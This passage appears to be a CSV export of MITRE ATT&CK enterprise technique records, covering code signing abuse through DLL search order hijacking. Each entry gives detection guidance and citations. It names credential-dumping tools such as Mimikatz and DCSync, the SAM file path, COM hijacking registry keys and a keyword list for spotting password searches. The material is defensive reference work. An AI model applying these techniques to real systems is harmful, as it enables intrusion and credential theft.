"attack-pattern","attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d","2017-05-31T21:31:26.474Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Code Signing","Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)

Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system.

Detection: Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.

Platforms: Windows, macOS

Data Sources: Binary file metadata

Defense Bypassed: Windows User Account Control","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1116', 'external_id': 'T1116'}, {'source_name': 'Wikipedia Code Signing', 'description': 'Wikipedia. (2015, November 10). Code Signing. Retrieved March 31, 2016.', 'url': 'https://en.wikipedia.org/wiki/Code%20signing'}, {'source_name': 'Janicab', 'description': 'Thomas. (2013, July 15). New signed malware called Janicab. Retrieved July 17, 2017.', 'url': 'http://www.thesafemac.com/new-signed-malware-called-janicab/'}, {'source_name': 'Securelist Digital Certificates', 'description': 'Ladikov, A. (2015, January 29). Why You Shouldn’t Completely Trust Files Signed with Digital Certificates. Retrieved March 31, 2016.', 'url': 'https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/'}, {'source_name': 'Symantec Digital Certificates', 'description': 'Shinotsuka, H. (2013, February 22). How Attackers Steal Private Keys from Digital Certificates. Retrieved March 31, 2016.', 'url': 'http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Binary file metadata']","","['Windows', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Windows User Account Control']"
"attack-pattern","attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830","2017-05-31T21:30:49.546Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Command-Line Interface","Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. Scheduled Task).

Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.

Detection: Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.

Platforms: Linux, Windows, macOS

Data Sources: Process command-line parameters, Process monitoring

Permissions Required: Administrator, SYSTEM, User

Remote Support: No","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1059', 'external_id': 'T1059'}, {'source_name': 'Wikipedia Command-Line Interface', 'description': 'Wikipedia. (2016, June 26). Command-line interface. Retrieved June 27, 2016.', 'url': 'https://en.wikipedia.org/wiki/Command-line%20interface'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process command-line parameters', 'Process monitoring']","['Administrator', 'SYSTEM', 'User']","['Linux', 'Windows', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","False","",""
"attack-pattern","attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e","2017-05-31T21:30:42.657Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Commonly Used Port","Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as
* TCP:80 (HTTP)
* TCP:443 (HTTPS)
* TCP:25 (SMTP)
* TCP/UDP:53 (DNS)

They may use the protocol associated with the port or a completely different protocol. 

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are 
* TCP/UDP:135 (RPC)
* TCP/UDP:22 (SSH)
* TCP/UDP:3389 (RDP)

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1043', 'external_id': 'T1043'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef","2017-05-31T21:31:09.379Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Communication Through Removable Media","Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.

Detection: Monitor file access on removable media. Detect processes that execute when removable media is mounted.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Data loss prevention

Requires Network: No","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1092', 'external_id': 'T1092'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Data loss prevention']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","False",""
"attack-pattern","attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44","2017-05-31T21:31:22.374Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Component Firmware","Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.

Platforms: Windows

Defense Bypassed: Anti-virus, File monitoring, Host intrusion prevention systems

Permissions Required: SYSTEM

System Requirements: Ability to update component device firmware from the host operating system.","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1109', 'external_id': 'T1109'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","","['SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Ability to update component device firmware from the host operating system.']","","","['Anti-virus', 'File monitoring', 'Host intrusion prevention systems']"
"attack-pattern","attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69","2017-05-31T21:31:33.979Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Component Object Model Hijacking","The  (Citation: Microsoft Component Object Model) (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.

Detection: There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within `HKEY_CURRENT_USER\Software\Classes\CLSID\` may be anomalous and should be investigated since user objects will be loaded prior to machine objects in `HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\`. (Citation: Endgame COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.

Platforms: Windows

Data Sources: Windows Registry, DLL monitoring, Loaded DLLs

Defense Bypassed: Autoruns Analysis

Permissions Required: User

Contributors: ENDGAME","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1122', 'external_id': 'T1122'}, {'source_name': 'Microsoft Component Object Model', 'description': 'Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.', 'url': 'https://msdn.microsoft.com/library/ms694363.aspx'}, {'source_name': 'GDATA COM Hijacking', 'description': 'G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.', 'url': 'https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence'}, {'source_name': 'Endgame COM Hijacking', 'description': 'Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.', 'url': 'https://www.endgame.com/blog/how-hunt-detecting-persistence-evasion-com'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Registry', 'DLL monitoring', 'Loaded DLLs']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['ENDGAME']","","","","","['Autoruns Analysis']"
"attack-pattern","attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea","2017-05-31T21:31:08.479Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Connection Proxy","A connection proxy is used to direct network traffic between systems or act as an intermediary for network communications. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools)

The definition of a proxy can also be expanded out to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.

The network may be within a single organization or across organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.

Detection: Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Process use of network, Process monitoring, Netflow/Enclave netflow, Packet capture

Requires Network: Yes

Contributors: Walker Johnson","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1090', 'external_id': 'T1090'}, {'source_name': 'Trend Micro APT Attack Tools', 'description': 'Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.', 'url': 'http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Walker Johnson']","","","","True",""
"attack-pattern","attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67","2017-12-14T16:46:06.044Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Create Account","Adversaries with a sufficient level of access may create a local system or domain account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

The `net user` commands can be used to create a local or domain account.

Detection: Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.

Platforms: Linux, macOS, Windows

Data Sources: Process Monitoring, Process command-line parameters, Authentication logs, Windows event logs

Permissions Required: Administrator","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1136', 'external_id': 'T1136'}, {'source_name': 'Microsoft User Creation Event', 'description': 'Lich, B., Miroshnikov, A. (2017, April 5). 4720(S): A user account was created. Retrieved June 30, 2017.', 'url': 'https://docs.microsoft.com/windows/device-security/auditing/event-4720'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']","['Administrator']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22","2017-05-31T21:30:19.735Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Credential Dumping","Credential dumping is the process of obtaining account login and password information from the operating system and software. Credentials can be used to perform Lateral Movement and access restricted information.

Tools may dump credentials in many different ways: extracting credential hashes for offline cracking, extracting plaintext passwords, and extracting Kerberos tickets, among others. Examples of credential dumpers include pwdump7, Windows Credential Editor, Mimikatz, and gsecdump. These tools are in use by both professional security testers and adversaries.

Plaintext passwords can be obtained using tools such as Mimikatz to extract passwords stored by the Local Security Authority (LSA). If smart cards are used to authenticate to a domain using a personal identification number (PIN), then that PIN is also cached as a result and may be dumped. (Citation: Github Mimikatz Module sekurlsa)

DCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller.  Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data  (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in Account Manipulation. (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the ""lsadump"" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)

Detection: Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective Process Injection to reduce potential indicators of malicious activity.

NTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised Valid Accounts in-use by adversaries may help as well. 

On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.

Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)

Platforms: Windows

Data Sources: API monitoring, Process command-line parameters, Process monitoring, PowerShell logs

Permissions Required: Administrator, SYSTEM

Contributors: Vincent Le Toux","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1003', 'external_id': 'T1003'}, {'source_name': 'Github Mimikatz Module sekurlsa', 'description': 'Delpy, B. (2014, September 14). Mimikatz module ~ sekurlsa. Retrieved January 10, 2016.', 'url': 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa'}, {'source_name': 'Powersploit', 'description': 'PowerSploit. (n.d.).  Retrieved December 4, 2014.', 'url': 'https://github.com/mattifestation/PowerSploit'}, {'source_name': 'ADSecurity Mimikatz DCSync', 'description': 'Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017.', 'url': 'https://adsecurity.org/?p=1729'}, {'source_name': 'Harmj0y Mimikatz and DCSync', 'description': 'Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017.', 'url': 'http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/'}, {'source_name': 'GitHub Mimikatz lsadump Module', 'description': 'Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017.', 'url': 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump'}, {'source_name': 'Microsoft DRSR Dec 2017', 'description': 'Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017.', 'url': 'https://msdn.microsoft.com/library/cc228086.aspx'}, {'source_name': 'Microsoft GetNCCChanges', 'description': 'Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017.', 'url': 'https://msdn.microsoft.com/library/dd207691.aspx'}, {'source_name': 'Samba DRSUAPI', 'description': 'SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.', 'url': 'https://wiki.samba.org/index.php/DRSUAPI'}, {'source_name': 'Wine API samlib.dll', 'description': 'Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017.', 'url': 'https://source.winehq.org/WineAPI/samlib.html'}, {'source_name': 'InsiderThreat ChangeNTLM July 2017', 'description': 'Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.', 'url': 'https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM'}, {'source_name': 'Microsoft NRPC Dec 2017', 'description': 'Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017.', 'url': 'https://msdn.microsoft.com/library/cc237008.aspx'}, {'source_name': 'AdSecurity DCSync Sept 2015', 'description': 'Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017.', 'url': 'https://adsecurity.org/?p=1729'}, {'source_name': 'Harmj0y DCSync Sept 2015', 'description': 'Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017.', 'url': 'http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/'}, {'source_name': 'Microsoft SAMR', 'description': 'Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.', 'url': 'https://msdn.microsoft.com/library/cc245496.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Vincent Le Toux']","","","","",""
"attack-pattern","attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c","2017-05-31T21:31:02.188Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Credentials in Files","Adversaries may search local file systems and remote file shares for files containing passwords.  These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through Credential Dumping. (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

Detection: While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See Valid Accounts for more information.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process command-line parameters

Permissions Required: User, Administrator, SYSTEM

System Requirements: Access to files","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1081', 'external_id': 'T1081'}, {'source_name': 'CG 2014', 'description': 'CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part 1. Retrieved November 12, 2014.', 'url': 'http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html'}, {'source_name': 'SRD GPP', 'description': 'Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015.', 'url': 'http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring', 'Process command-line parameters']","['User', 'Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Access to files']","","",""
"attack-pattern","attack-pattern--f72eb8a8-cd4c-461d-a814-3f862befbf00","2017-05-31T21:31:10.314Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Custom Command and Control Protocol","Adversaries may communicate using a custom command and control protocol instead of using existing Standard Application Layer Protocol to encapsulate commands. Implementations could mimic well-known protocols.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1094', 'external_id': 'T1094'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--3b3cbbe0-6ed3-4334-b543-3ddfd8c5642d","2017-05-31T21:30:31.197Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Custom Cryptographic Protocol","Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.

Custom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.

Some adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. (Citation: F-Secure Cosmicduke)

Detection: If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Malware reverse engineering, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1024', 'external_id': 'T1024'}, {'source_name': 'F-Secure Cosmicduke', 'description': 'F-Secure Labs. (2014, July). COSMICDUKE Cosmu with a twist of MiniDuke. Retrieved July 3, 2014.', 'url': 'https://www.f-secure.com/documents/996508/1030745/cosmicduke%20whitepaper.pdf'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}, {'source_name': 'Fidelis DarkComet', 'description': 'Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for a DarkComet. Retrieved April 5, 2016.', 'url': 'https://www.fidelissecurity.com/sites/default/files/FTA%201018%20looking%20at%20the%20sky%20for%20a%20dark%20comet.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--46944654-fcc1-4f63-9dad-628102376586","2017-05-31T21:30:40.604Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","DLL Search Order Hijacking","Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. 

Adversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. 

Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)

If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.

Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.

Detection: Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.

Platforms: Windows

Data Sources: File monitoring, DLL monitoring, Process command-line parameters, Process monitoring

Effective Permissions: User, Administrator, SYSTEM

Defense Bypassed: Process whitelisting

